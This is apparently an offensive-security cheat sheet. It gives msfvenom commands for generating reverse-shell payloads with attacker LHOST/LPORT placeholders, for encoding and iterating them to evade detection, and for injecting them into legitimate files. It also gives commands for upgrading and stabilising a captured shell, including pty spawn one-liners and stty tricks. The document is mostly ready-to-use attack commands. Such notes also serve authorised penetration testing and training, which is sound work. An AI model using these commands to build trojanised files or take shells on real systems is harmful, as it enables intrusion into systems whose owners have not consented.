Note on reverse shell payloads: If the payload is sent through the browser, double encoding is required (this is to encode the `&` characters in the payload, else just use Burp Suite).
### msfvenom
List payloads
```shell
msfvenom --list payloads
```
- **Generating** a payload
```bash
msfvenom -a [architecture] -p [payload] --platform [os] LHOST="[LHOST]" LPORT="[LPORT]" -f [file type] > [file]
```
- List all payload **formats**
```bash
msfvenom --list formats
```
- List all encoders
```bash
msfvenom --list encoders
```
- **Encoding** a payload
```bash
msfvenom -a [architecture] -p [payload] --platform [os] LHOST="[LHOST]" LPORT="[LPORT]" -f [file type] **-e [encoder]** > [file]
```
- **Iterating** encoders
```bash
msfvenom -a [architecture] -p [payload] --platform [os] LHOST="[LHOST]" LPORT="[LPORT]" -f [file type] -i [iterations] -e [encoder] > [file]
```
- Copying a legitimate **file format**
```bash
msfvenom -a [architecture] -p [payload] --platform [os] LHOST="[LHOST]" LPORT="[LPORT]" -f [file type] -i [iterations] -e [encoder] -x [legitimate file PATH] > [file]
```
- **Injecting** payload into file
```bash
msfvenom -a [architecture] -p [payload] --platform [os] LHOST="[LHOST]" LPORT="[LPORT]" -f [file type] -i [iterations] -e [encoder] -x [legitimate file PATH] -k > [file]
```
### Upgrading Shell
Check tty
```bash
tty
```
Spawning Interactive shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")' 
/bin/bash -i
perl -e 'exec "/bin/bash"'
```
Stable shell environment
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export SHELL=bash
export TERM=xterm-256color
alias ll='clear ; ls -lsaht --color=auto'
Ctrl + Z
exec bash --login # Kali Linux Zsh may break stty conver to Bash
ps -p $$ <- this is to confirm
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```
